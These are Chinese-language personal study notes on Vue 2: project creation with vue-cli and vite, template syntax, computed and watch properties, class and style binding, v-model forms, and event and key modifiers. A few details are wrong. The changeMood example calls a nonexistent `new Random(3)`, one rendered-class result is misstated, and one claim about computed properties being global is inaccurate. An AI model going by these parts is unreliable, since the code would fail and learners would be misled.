# 创建工程

## 0. 安装

```bash
## 查看@vue/cli版本，确保@vue/cli版本在4.5.0以上
vue --version
## 版本过低,进行安装或者升级你的@vue/cli
npm install -g @vue/cli
```

<img src="vue%E7%AC%94%E8%AE%B0.assets/1646013875631-b37e798f-1abf-4bf1-8d5b-b98a80767762.png" alt="img" style="zoom: 60%;" />

## 1. 使用 vue-cli 创建

官方文档：https://cli.vuejs.org/zh/guide/creating-a-project.html#vue-create

vue2.0和vue3.0的区别

1. 创建项目方式：
   + 3.0的安装：vue create 3.0project(项目名) 选择默认选择default方式即可
   + 2.0的安装：vue init webpack(据我所知有五个，这个是我常用的) 2.0project(项目名)
2. 打包方式：
   + 2.0是:   npm run dev
   + 3.0是：npm run serve
3. 工程目录：
   + 3.0 取消掉了config目录、build目录、static目录 ,还有最重要的一点，3.0的安装项目时自动下载node-model  vue.config.js也没了，需要手动添加。

vue create 是vue-cli3.x的初始化方式，目前模板是固定的，模板选项可自由配置，创建出来的是vue-cli3的项目，与cue-cli2项目结构不同，配置方法不同，具体配置方法参考官方文档。

vue init 是vue-cli2.x的初始化方式，可以使用github上面的一些模板来初始化项目，webpack是官方推荐的标准模板名。vue-cli2.x项目向3.x迁移只需要把static目录复制到public目录下，老项目的src目录覆盖3.x的src目录(如果修改了配置，可以查看文档，用cli3的方法进行配置)

**示例:  创建vue3.0**

```bash
## 创建
vue create <3.0project-name>
## 启动
cd <project-name>
npm run serve
```

<img src="vue%E7%AC%94%E8%AE%B0.assets/image-20231120154346809.png" alt="image-20231120154346809" style="zoom:80%;" />

## 2.使用 vite 创建

官方文档：https://v3.cn.vuejs.org/guide/installation.html#vite

vite官网：https://vitejs.cn

-  新一代前端构建工具。
- 优势如下：
  - 开发环境中，无需打包操作，可快速的冷启动。
  - 轻量快速的热重载（HMR）。
  - 真正的按需编译，不再等待整个应用编译完成。

```bash
## 创建工程
npm init vite-app <project-name>
## 进入工程目录
cd <project-name>
## 安装依赖
npm install
## 运行
npm run dev
```

**支持可视化操作**

```bash
$ vue ui
🚀  Starting GUI...
🌠  Ready on http://localhost:8000
```

默认开启 8000 端口, 也可自定义端口访问:

```bash
$ vue ui -p 3000
```

<img src="vue%E7%AC%94%E8%AE%B0.assets/image-20231120165258643.png" alt="image-20231120165258643" style="zoom: 60%;" />

## 3. 脚手架工程项目结构

图示

<img src="vue%E7%AC%94%E8%AE%B02.0.assets/image-20231120230752338.png" alt="image-20231120230752338" style="zoom:80%;" />

示例:  注意这是vue2.0的项目结构, 跟vue create创建vue3.0有区别

| 项目目录及各目录介绍如下：                                   |
| ------------------------------------------------------------ |
| ![image-20231120162909626](vue%E7%AC%94%E8%AE%B0.assets/image-20231120162909626.png) |

![image-20231120164818206](vue%E7%AC%94%E8%AE%B0.assets/image-20231120164818206.png)

![img](vue%E7%AC%94%E8%AE%B0.assets/1646014014891-d226341c-0ef7-4c94-9b50-6b274d6f2b4b.png)

### 关于不同版本的Vue

1. vue.js与vue.runtime.xxx.js的区别：
   1. vue.js是完整版的Vue，包含：核心功能 + 模板解析器。
   2. vue.runtime.xxx.js是运行版的Vue，只包含：核心功能；没有模板解析器。
2. 因为vue.runtime.xxx.js没有模板解析器，所以不能使用template这个配置项，需要使用render函数接收到的createElement函数去指定具体内容。

### vue.config.js配置文件

1. 使用vue inspect > output.js可以查看到Vue脚手架的默认配置。
2. 使用vue.config.js可以对脚手架进行个性化定制，详情见：https://cli.vuejs.org/zh

# Vue2

Vue (读音 /vjuː/，类似于 view) 是一套用于构建用户界面的渐进式框架。与其它大型框架不同的是，Vue 被设计为可以自底向上逐层应用。Vue 的核心库只关注视图层，不仅易于上手，还便于与第三方库或既有项目整合。另一方面，当与现代化的工具链以及各种支持类库结合使用时，Vue 也完全能够为复杂的单页应用提供驱动。

## 模板语法

+ 容器和vue实例是一对一关系
+ 真实开发中只有一个Vue实例，并且会配合着组件一起使用

### 插值语法

1. 功能: 用于解析标签体内容, 不能在标签属性中使用
2. 语法: {{xxx}} ，xxx 会作为js 表达式解析, 直接读取到data中的所有属性

####  简单使用插值表达式获取数据

```html
<div id="app">
	{{title}}
</div>
```

<img src="vue%E7%AC%94%E8%AE%B0.assets/image-20231120155140099.png" style="zoom: 50%;" />

####  在插值表达式中获取数组中的内容

```html
<div id="app">
	{{[1,2,3,4][2]}}
</div>
```

此时，页面上会显示“3”，也就是数组中的第三个元素被获取。

#### 使用插值表达式获取对象中的属性

```html
<div id="app">
	{{ {"name":"xiaoyu","age":20}.age }}
</div>
```

此时，页面上会显示“20”，也就是对象中age属性的值。

#### 使用插值表达式调用Vue中的方法

```html
<div id="app">
		{{ sayHello()}}
</div>
```

此时，页面上会显示“hello vue”，也就是调用了vue对象中的sayHello方法，并展示了方法的返回值。

### 指令语法

1. 功能：用于解析标签（包括：标签属性、标签体内容、绑定事件.....）
2.  语法：xxx 会作为js 表达式解析, 直接读取到data中的所有属性

```vue
<a v-bind:href="school.url.toUpperCase()" x="hello">点我去{{school.name}}学习1</a>
<a :href="school.url" x="hello">点我去{{school.name}}学习2</a>
```

注意：Vue中有很多的指令，且形式都是：v-????

### 综合代码

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>模板语法</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="app">
			<h1>插值语法</h1>
			<h3>你好，{{name}}</h3>
			<hr/>
			<h1>指令语法</h1>
			<a v-bind:href="school.url.toUpperCase()" x="hello">点我去{{school.name}}学习1</a>
			<a :href="school.url" x="hello">点我去{{school.name}}学习2</a>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
		// 创建vue实例
		new Vue({
			el:'#app',  //值通常为css选择器字符串。
			data:{ //data中用于存储数据，数据供el所指定的容器去使用。
				name:'jack',
				school:{
					name:'尚硅谷',
					url:'http://www.atguigu.com',
				}
			}
		})

	</script>
</html>
```

运行结果

<img src="vue%E7%AC%94%E8%AE%B0.assets/image-20231117212512366.png" alt="image-20231117212512366" style="zoom:67%;" />

## 属性

### data属性

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>el与data的两种写法</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 
			data与el的2种写法
					1.el有2种写法
									(1).new Vue时候配置el属性。
									(2).先创建Vue实例，随后再通过vm.$mount('#root')指定el的值。
					2.data有2种写法
									(1).对象式
									(2).函数式
									如何选择：目前哪种写法都可以，以后学习到组件时，data必须使用函数式，否则会报错。
					3.一个重要的原则：
									由Vue管理的函数，一定不要写箭头函数，一旦写了箭头函数，this就不再是Vue实例了。
		-->
		<!-- 准备好一个容器-->
		<div id="root">
			<h1>你好，{{name}}</h1>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		//el的两种写法
		/* const v = new Vue({
			//el:'#root', //第一种写法
			data:{
				name:'尚硅谷'
			}
		})
		console.log(v)
		v.$mount('#root') //第二种写法 */

		//data的两种写法
		new Vue({
			el:'#root',
			//data的第一种写法：对象式
			/* data:{
				name:'尚硅谷'
			} */

			//data的第二种写法：函数式(推荐)
			data(){
				console.log('@@@',this) //此处的this是Vue实例对象
				return{
					name:'尚硅谷'
				}
			}
		})
	</script>
</html>
```

### 计算属性

#### 计算属性与方法的区别

##### 方法

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>姓名案例_methods实现</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			姓：<input type="text" v-model="firstName"> <br/><br/>
			名：<input type="text" v-model="lastName"> <br/><br/>
			全名：<span>{{fullName()}}</span>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		new Vue({
			el:'#root',
			data:{
				firstName:'张',
				lastName:'三'
			},
			methods: {
				fullName(){
					console.log('@---fullName')
					return this.firstName + '-' + this.lastName
				}
			},
		})
	</script>
</html>
```

##### 计算属性

<font color=red>当所依赖的数据发生变化时, 就会随之调用</font>

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>姓名案例_计算属性实现</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 
			计算属性：
					1.定义：要用的属性不存在，要通过已有属性计算得来。
					2.原理：底层借助了Objcet.defineproperty方法提供的getter和setter。
					3.get函数什么时候执行？
								(1).初次读取时会执行一次。
								(2).当依赖的数据发生改变时会被再次调用。
					4.优势：与methods实现相比，内部有缓存机制（复用），效率更高，调试方便。
					5.备注：
							1.计算属性最终会出现在vm上，直接读取使用即可。
							2.如果计算属性要被修改，那必须写set函数去响应修改，且set中要引起计算时依赖的数据发生改变。
		 -->
		<!-- 准备好一个容器-->
		<div id="root">
			姓：<input type="text" v-model="firstName"> <br/><br/>
			名：<input type="text" v-model="lastName"> <br/><br/>
			测试：<input type="text" v-model="x"> <br/><br/>
			全名：<span>{{fullName}}</span> <br/><br/>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		const vm = new Vue({
			el:'#root',
			data:{                         // 属性
				firstName:'张',
				lastName:'三',
				x:'你好'
			},
			computed:{                     // 计算属性
                // 定义fullName属性
				fullName:{
					//get有什么作用？当有人读取fullName时，get就会被调用，且返回值就作为fullName的值
					//get什么时候调用？1.初次读取fullName时。2.所依赖的数据发生变化时。
					get(){
						console.log('get被调用了')
						// console.log(this) //此处的this是vm
						return this.firstName + '-' + this.lastName
					},
					//set什么时候调用? 当fullName被修改时。
					set(value){
						console.log('set',value)
						const arr = value.split('-')
						this.firstName = arr[0]
						this.lastName = arr[1]
					}
				}
                /*
                //简写, 确定只用get()就用简写
				fullName(){
					console.log('get被调用了')
					return this.firstName + '-' + this.lastName
				}
				*/
			},
            methods: {  // 方法
				demo(){
				}
			}
            
		})
	</script>
</html>
```

- methods：定义方法，调用方法使用 currentTime1()，需要带括号
- computed：定义计算属性，调用属性使用 currentTime2，不需要带括号

计算属性和data区别在，计算属性定义的一个全局变量，data定义的时候局部变量

注意：methods 和 computed 里不能重名

### 监视属性

<font color=red>当监视的数据发生变化时, 就会随之调用</font>

#### 基本使用

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>天气案例_监视属性_简写</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			<h2>今天天气很{{info}}</h2>
			<button @click="changeWeather">切换天气</button>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
		
		const vm = new Vue({
			el:'#root',
			data:{
				isHot:true,
			},
			computed:{
				info(){
					return this.isHot ? '炎热' : '凉爽'
				}
			},
			methods: {
				changeWeather(){
					this.isHot = !this.isHot
				}
			},
			watch:{
				isHot:{
					// immediate:true, //初始化时让handler调用一下
					handler(newValue, oldValue){
						console.log('isHot被修改了',newValue,oldValue)
					}
				}, 
                /*
				//简写, 确定只用handler()就用简写
				isHot(newValue,oldValue){
					console.log('isHot被修改了',newValue,oldValue,this)
				} 
				*/
			}
		})

		//正常写法
		/* vm.$watch('isHot',{
			immediate:true, //初始化时让handler调用一下
			deep:true,//深度监视
			handler(newValue,oldValue){
				console.log('isHot被修改了',newValue,oldValue)
			}
		}) */

		//简写
		/* vm.$watch('isHot',(newValue,oldValue)=>{
			console.log('isHot被修改了',newValue,oldValue,this)
		}) */

	</script>
</html>
```

![image-20231120210638273](vue%E7%AC%94%E8%AE%B0.assets/image-20231120210638273.png)

#### 深度监视

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>天气案例_深度监视</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 
				深度监视：
						(1).Vue中的watch默认不监测对象内部值的改变（一层）。
						(2).配置deep:true可以监测对象内部值改变（多层）。
				备注：
						(1).Vue自身可以监测对象内部值的改变，但Vue提供的watch默认不可以！
						(2).使用watch时根据数据的具体结构，决定是否采用深度监视。
		 -->
		<!-- 准备好一个容器-->
		<div id="root">
			<h2>今天天气很{{info}}</h2>
			<button @click="changeWeather">切换天气</button>
			<hr/>
			<h3>a的值是:{{numbers.a}}</h3>
			<button @click="numbers.a++">点我让a+1</button>
			<h3>b的值是:{{numbers.b}}</h3>
			<button @click="numbers.b++">点我让b+1</button>
			<button @click="numbers = {a:666,b:888}">彻底替换掉numbers</button>
			{{numbers.c.d.e}}
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
		
		const vm = new Vue({
			el:'#root',
			data:{
				isHot:true,
				numbers:{
					a:1,
					b:1,
					c:{
						d:{
							e:100
						}
					}
				}
			},
			computed:{
				info(){
					return this.isHot ? '炎热' : '凉爽'
				}
			},
			methods: {
				changeWeather(){
					this.isHot = !this.isHot
				}
			}, //监视
			watch:{
				isHot:{
					// immediate:true, //初始化时让handler调用一下
					//handler什么时候调用？当isHot发生改变时。
					handler(newValue,oldValue){
						console.log('isHot被修改了',newValue,oldValue)
					}
				},
				//监视多级结构中某个属性的变化,要加'xx.yy'
				'numbers.a':{
					handler(){
						console.log('a被改变了')
					}
				}, 
				//监视多级结构中所有属性的变化
				numbers:{
					deep:true,
					handler(){
						console.log('numbers改变了')
					}
				}
			}
		})
	</script>
</html>
```

## 动态数据绑定

### 单向数据绑定(:)

1. 语法：
   + v-bind:value ="xxx" 
   + :value="xxx"   (推荐)
2. 特点：数据只能从data 流向页面

#### class绑定

> 动态绑定 class，只需要在 class 前加入 `v-bind` 即可，即 `v-bind:class` 简写为 `:class`。

##### 字符串语法

```html
<div class="basic" :class="mood" @click="changeMood">{{name}}</div> <br/><br/>
```

```html
data: {
 	mood:'normal',
}
```

结果渲染为：

```html
<div class="basic mood"></div>
```

##### 对象语法

一般写法：

```html
<div :class="{ active: isActive }"></div>
```

可以与普通 class 属性共存：

```html
<div class="static"
     :class="{ active: isActive, 'text-danger': hasError }">
</div>
```

```javascript
data: {
  isActive: true,
  hasError: false
}
```

结果渲染为：

```html
<div class="static active"></div>
```

① 绑定的数据对象不必内联定义在模板里(推荐写法)：

```html
<div :class="classObject"></div>
```

```javascript
data: {
  classObject: {
    active: true,
    'text-danger': false
  }
}
```

② 可以绑定一个返回对象的计算属性:

```html
<div v-bind:class="classObject"></div>
```

```javascript
data: {
  isActive: true,
  error: null
},
computed: {
  classObject: function () {
    return {
      active: this.isActive && !this.error,
      'text-danger': this.error && this.error.type === 'fatal'
    }
  }
}
```

##### 数组语法

一般写法：

```html
<div v-bind:class="[activeClass, errorClass]"></div>
```

```javascript
data: {
  activeClass: 'active',
  errorClass: 'text-danger'
}
```

渲染为：

```html
<div class="active text-danger"></div>
```

①  如果想根据条件切换列表中的 class，可以用三元表达式：

```html
<div v-bind:class="[isActive ? activeClass : '', errorClass]"></div>
```

②  当有多个条件 class 时这样写有些繁琐。所以在数组语法中也可以嵌套使用对象语法：

```html
<div v-bind:class="[{ active: isActive }, errorClass]"></div>
```

#### style绑定

> 动态绑定 style，只需要在 style 前加入 `v-bind` 即可，即 `v-bind:style` 简写为 `:style`。

##### 对象语法

一般写法：

```html
<div v-bind:style="{ color: activeColor, fontSize: fontSize + 'px' }"></div>
```

```javascript
data: {
  activeColor: 'red',
  fontSize: 30
}
```

①  直接绑定到一个样式对象通常更好：

```html
<div v-bind:style="styleObject"></div>
```

```javascript
data: {
  styleObject: {
    color: 'red',
    fontSize: '13px'
  }
}
```

同样的，对象语法常常结合返回对象的计算属性使用。

##### 数组语法

一般写法：

```html
<div v-bind:style="[baseStyles, overridingStyles]"></div>
```

##### 自动添加前缀

当 `v-bind:style` 使用需要添加[浏览器引擎前缀](https://developer.mozilla.org/zh-CN/docs/Glossary/Vendor_Prefix)的 CSS 属性时，如 `transform`，Vue.js 会自动侦测并添加相应的前缀。

##### 多重值

从 Vue 2.3.0 起可以为 `style` 绑定中的属性提供一个包含多个值的数组，常用于提供多个带前缀的值，例如：

```html
<div :style="{ display: ['-webkit-box', '-ms-flexbox', 'flex'] }"></div>
```

这样写只会渲染数组中最后一个被浏览器支持的值。在本例中，如果浏览器支持不带浏览器前缀的 flexbox，那么就只会渲染 `display: flex`。

#### 综合代码

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>绑定样式</title>
		<style>
			.basic{
				width: 400px;
				height: 100px;
				border: 1px solid black;
			}
			
			.happy{
				border: 4px solid red;;
				background-color: rgba(255, 255, 0, 0.644);
				background: linear-gradient(30deg,yellow,pink,orange,yellow);
			}
			.sad{
				border: 4px dashed rgb(2, 197, 2);
				background-color: gray;
			}
			.normal{
				background-color: skyblue;
			}

			.atguigu1{
				background-color: yellowgreen;
			}
			.atguigu2{
				font-size: 30px;
				text-shadow:2px 2px 10px red;
			}
			.atguigu3{
				border-radius: 20px;
			}
		</style>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 
			绑定样式：
					1. class样式
								写法:class="xxx" xxx可以是字符串、对象、数组。
										字符串写法适用于：类名不确定，要动态获取。
										对象写法适用于：要绑定多个样式，个数不确定，名字也不确定。
										数组写法适用于：要绑定多个样式，个数确定，名字也确定，但不确定用不用。
					2. style样式
								:style="{fontSize: xxx}"其中xxx是动态值。
								:style="[a,b]"其中a、b是样式对象。
		-->
		<!-- 准备好一个容器-->
		<div id="root">
			// 方法1
			<!-- 绑定class样式--①字符串写法，适用于：样式的类名不确定，需要动态指定 -->
			<div class="basic" :class="mood" @click="changeMood">{{name}}</div> <br/><br/>

			<!-- 绑定class样式--②数组写法，适用于：要绑定的样式个数不确定、名字也不确定 -->
			<div class="basic" :class="classArr">{{name}}</div> <br/><br/>

			<!-- 绑定class样式--③对象写法，适用于：要绑定的样式个数确定、名字也确定，但要动态决定用不用 -->
			<div class="basic" :class="classObj">{{name}}</div> <br/><br/>

			// 方法2
			<!-- 绑定style样式--对象写法 -->
			<div class="basic" :style="styleObj">{{name}}</div> <br/><br/>
			<!-- 绑定style样式--数组写法 -->
			<div class="basic" :style="styleArr">{{name}}</div>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false
		
		const vm = new Vue({
			el:'#root',
			data:{
				name:'尚硅谷',
				mood:'normal',
				classArr:['atguigu1','atguigu2','atguigu3'],
				classObj:{
					atguigu1:false,
					atguigu2:false,
				}, 
				// style
				styleObj:{
					fontSize: '40px',
					color:'red',
				},
				styleObj2:{
					backgroundColor:'orange'
				},
				styleArr:[
					{
						fontSize: '40px',
						color:'blue',
					},
					{
						backgroundColor:'gray'
					}
				]
			},
			methods: {
				changeMood(){
					const arr = ['happy','sad','normal']
					const index = Math.floor(new Random(3))
					this.mood = arr[index]
				}
			},
		})
	</script>
	
</html>
```

<img src="vue%E7%AC%94%E8%AE%B0.assets/image-20231120160345054.png" alt="image-20231120160345054" style="zoom: 50%;" />

### 双向数据绑定(v-model)

1. 语法：
   + v-mode:value="xxx" 
   + v-model="xxx"   (推荐)
2. 特点：数据不仅能从data 流向页面，还能从页面流向data

3. v-model的三个修饰符：
   + lazy：失去焦点再收集数据
   + number：输入字符串转为有效的数字
   + trim：输入首尾空格过滤
4. 收集表单数据：
   + 若：<input type="text"/>，则v-model收集的是value值，用户输入的就是value值。 ------ 不设置默认value值。
   + 若：<input type="radio"/>，则v-model收集的是value值，且要给标签配置value值  ------ 设置默认value值。
   + 若：<input type="checkbox"/>
     + 没有配置input的value属性
       + v-model收集的就是布尔值（勾选 or 未勾选，是布尔值）
     + 配置input的value属性:
       + (1)v-model的初始值是非数组，那么收集的就是布尔值（勾选 or 未勾选，是布尔值）
       + (2)v-model的初始值是数组，那么收集的的就是value 

#### 综合代码

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>收集表单数据</title>
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			// 表单
			<form @submit.prevent="demo">    //表单提交调用demo()
				// 属性绑定
				账号：<input type="text" v-model.trim="userInfo.account"> <br/><br/>
				密码：<input type="password" v-model="userInfo.password"> <br/><br/>
				年龄：<input type="number" v-model.number="userInfo.age"> <br/><br/>
				性别：
				男<input type="radio" name="sex" v-model="userInfo.sex" value="male">
				女<input type="radio" name="sex" v-model="userInfo.sex" value="female"> <br/><br/>
				爱好：
				学习<input type="checkbox" v-model="userInfo.hobby" value="study">
				打游戏<input type="checkbox" v-model="userInfo.hobby" value="game">
				吃饭<input type="checkbox" v-model="userInfo.hobby" value="eat">
				<br/><br/>
				所属校区
				<select v-model="userInfo.city">
					<option value="">请选择校区</option>
					<option value="beijing">北京</option>
					<option value="shanghai">上海</option>
					<option value="shenzhen">深圳</option>
					<option value="wuhan">武汉</option>
				</select>
				<br/><br/>
				其他信息：
				<textarea v-model.lazy="userInfo.other"></textarea> <br/><br/>
				<input type="checkbox" v-model="userInfo.agree">阅读并接受<a href="http://www.atguigu.com">《用户协议》</a>  //checkbox不用设置默认值
				<button>提交</button>
			</form>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false

		new Vue({
			el:'#root',
			data:{
				userInfo:{
					account:'',
					password:'',
					age:18,
					sex:'female',
					hobby:[],         //多选框 必须用数组
					city:'beijing',
					other:'',
					agree:''
				}
			},
			methods: {
				demo(){
					console.log(JSON.stringify(this.userInfo))   // JavaScript 对象或值转换为 JSON 字符串
				}
			}
		})
	</script>
</html>
```

运行结果

<img src="vue%E7%AC%94%E8%AE%B0.assets/image-20231117215824382.png" alt="image-20231117215824382" style="zoom:67%;" />

## 事件绑定(@)

关于事件，把握好三个步骤：设参、传参和接参。

**使用 v-on:xxx 或 @xxx  绑定事件，其中xxx是事件名**

+ 使用 `methods` 定义方法对事件进行处理
+ 在调用方法的时候传入一个 `$event`，这就是事件对象

### 基本使用

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>事件的基本使用</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 
				事件的基本使用：
							1.使用v-on:xxx 或 @xxx 绑定事件，其中xxx是事件名； 推荐使用@
							2.事件的回调需要配置在methods对象中，最终会在vm上；
							3.methods中配置的函数，不要用箭头函数！否则this就不是vm了；
							4.methods中配置的函数，都是被Vue所管理的函数，this的指向是vm 或 组件实例对象；
							5.@click="处理函数" 和 @click="demo($event)" 效果一致，但后者可以传参；
		-->

		<!-- 准备好一个容器-->
		<div id="root">
			<h2>欢迎来到{{name}}学习</h2>
			<!-- <button v-on:click="showInfo">点我提示信息</button> -->
			<button @click="showInfo1">点我提示信息1（不传参）</button>
			<button @click="showInfo2($event,666)">点我提示信息2（传参）</button>
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		const vm = new Vue({
			el:'#root',
			data:{
				name:'尚硅谷',
			},
			methods:{   // 事件
				showInfo1(event){
					alert('同学你好！')
				},
				showInfo2(event,number){
					console.log(event,number)
					alert('同学你好！！')
				}
			}
		})
	</script>
</html>
```

![](vue%E7%AC%94%E8%AE%B0.assets/image-20231120201516157.png)

### 通用事件修饰符

- `.stop`
- `.prevent`
- `.capture`
- `.self`
- `.once`
- `.passive`

```html
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>事件修饰符</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
		<style>
			*{
				margin-top: 20px;
			}
			.demo1{
				height: 50px;
				background-color: skyblue;
			}
			.box1{
				padding: 5px;
				background-color: skyblue;
			}
			.box2{
				padding: 5px;
				background-color: orange;
			}
			.list{
				width: 200px;
				height: 200px;
				background-color: peru;
				overflow: auto;
			}
			li{
				height: 100px;
			}
		</style>
	</head>
	<body>
		<!-- 
				Vue中的事件修饰符：
						1.prevent：阻止默认事件（常用）；
						2.stop：阻止事件冒泡（常用）；
						3.once：事件只触发一次（常用）；
						4.capture：使用事件的捕获模式；
						5.self：只有event.target是当前操作的元素时才触发事件；
						6.passive：事件的默认行为立即执行，无需等待事件回调执行完毕；
						7.可以连用比如: .passiveonce
		-->
		<!-- 准备好一个容器-->
		<div id="root">
			<h2>欢迎来到{{name}}学习</h2>
			<!-- 阻止默认事件（常用） -->
			<a href="http://www.atguigu.com" @click.prevent="showInfo">点我提示信息</a>  //这里的效果就是链接不会跳转,会出现弹窗

			<!-- 阻止事件冒泡（常用） -->
			<div class="demo1" @click="showInfo">
				<button @click.stop="showInfo">点我提示信息</button>
				<!-- 修饰符可以连续写 -->
				<!-- <a href="http://www.atguigu.com" @click.prevent.stop="showInfo">点我提示信息</a> -->
			</div>

			<!-- 事件只触发一次（常用） -->
			<button @click.once="showInfo">点我提示信息</button>

			<!-- 使用事件的捕获模式 -->
			<div class="box1" @click.capture="showMsg(1)">
				div1
				<div class="box2" @click="showMsg(2)">
					div2
				</div>
			</div>

			<!-- 只有event.target是当前操作的元素时才触发事件； -->
			<div class="demo1" @click.self="showInfo">
				<button @click="showInfo">点我提示信息</button>
			</div>

			<!-- 事件的默认行为立即执行，无需等待事件回调执行完毕；及优先响应默认行为 -->
			<ul @wheel.passive="demo" class="list"> //wheel鼠标滚轮
				<li>1</li>
				<li>2</li>
				<li>3</li>
				<li>4</li>
			</ul>

		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		new Vue({
			el:'#root',
			data:{
				name:'尚硅谷'
			},
			methods:{
				showInfo(e){
					alert('同学你好！')
					// console.log(e.target)
				},
				showMsg(msg){
					console.log(msg)
				},
				demo(){
					for (let i = 0; i < 100000; i++) {
						console.log('#')
					}
					console.log('累坏了')
				}
			}
		})
	</script>
</html>
```

![image-20231120202009399](vue%E7%AC%94%E8%AE%B0.assets/image-20231120202009399.png)

### 键盘事件(@keyup & @keydown)

#### 按键修饰符

##### 键盘常用的 keyCode

| keyCode  | 实际键值              |
| -------- | --------------------- |
| 48到57   | 0到9                  |
| 65到90   | a到z（A到Z）          |
| 112到135 | F1到F24               |
| 8        | BackSpace（退格）     |
| 9        | Tab                   |
| **13**   | Enter（回车）         |
| 20       | Caps_Lock（大写锁定） |
| 32       | Space（空格键）       |
| 37       | Left（左箭头）        |
| 38       | Up（上箭头）          |
| 39       | Right（右箭头）       |
| 40       | Down（下箭头）        |

##### 使用keyCode作为按键修饰符

在 Vue 中，允许为 `v-on` 在监听键盘事件时添加按键修饰符：

```html
<!-- 只有在 `keyCode` 是 13 时调用 `vm.submit()` -->
<input v-on:keyup.13="submit">
```

##### 按键修饰符别名

记住所有的 `keyCode` 比较困难，所以 Vue 为最常用的按键提供了别名：

```html
<!-- 同上 -->
<input v-on:keyup.enter="submit">

<!-- 缩写语法 -->
<input @keyup.enter="submit">
```

##### 按键别名表

| 别名    | 实际键值                                   |
| ------- | ------------------------------------------ |
| .delete | delete（删除）/BackSpace（退格）           |
| .tab    | Tab                                        |
| .enter  | Enter（回车）                              |
| .esc    | Esc（退出）                                |
| .space  | Space（空格键）                            |
| .left   | Left（左箭头）                             |
| .up     | Up（上箭头）                               |
| .right  | Right（右箭头）                            |
| .down   | Down（下箭头）                             |
| .ctrl   | Ctrl                                       |
| .alt    | Alt                                        |
| .shift  | Shift                                      |
| .meta   | (window系统下是window键，mac下是command键) |

##### 自定义别名

上面说了，可以通过 `config.keyCodes` 指定一按键修饰符别名。

例如，改变其中一个键值对应的别名：

```javascript
// 可以使用 `v-on:keyup.f1`
Vue.config.keyCodes.f1 = 112
```

又比如，改变多个键值对应的别名：

```javascript
Vue.config.keyCodes = {
  v: 86,
  f1: 112,
  // camelCase 不可用
  mediaPlayPause: 179,
  // 取而代之的是 kebab-case 且用双引号括起来
  "media-play-pause": 179,
  up: [38, 87]
}
```

使用的时候：

```html
<input type="text" @keyup.media-play-pause="method">
```

##### 自动匹配按键修饰符

> 2.5.0 新增

也可直接将 [`KeyboardEvent.key`](https://developer.mozilla.org/en-US/docs/Web/API/KeyboardEvent/key/Key_Values) 暴露的任意有效按键名转换为 kebab-case 来作为修饰符：

```html
<input @keyup.page-down="onPageDown">
```

在上面的例子中，处理函数仅在 `$event.key === 'PageDown'` 时被调用。

具体的`KeyboardEvent.key`可以在MDN中查看，这里仅列举一些常见的key:

```vue
Alt、Shift、Enter、Tab、
ArrowDown、ArrowLeft、ArrowRight、ArrowUp、
End、Home、PageDown、PageUp、
Backspace、Delete、Insert、
Copy、Cut、Paste、Redo、Undo、
Pause、Play、ZoomIn、ZoomOut
```

#### 系统修饰键

> 2.1.0 新增

可以用如下修饰符来实现仅在按下相应按键时才触发鼠标或键盘事件的监听器。

- `.ctrl`
- `.alt`
- `.shift`
- `.meta`

在 Mac 系统键盘上，meta 对应 command 键 (⌘)。在 Windows 系统键盘 meta 对应 Windows 徽标键 (⊞)。在 Sun 操作系统键盘上，meta 对应实心宝石键 (◆)。在其他特定键盘上，尤其在 MIT 和 Lisp 机器的键盘、以及其后继产品，比如 Knight 键盘、space-cadet 键盘，meta 被标记为“META”。在 Symbolics 键盘上，meta 被标记为“META”或者“Meta”。

例如：

```html
<!-- Alt + C -->
<input @keyup.alt.67="clear">

<!-- Ctrl + Click -->
<div @click.ctrl="doSomething">Do something</div>
```

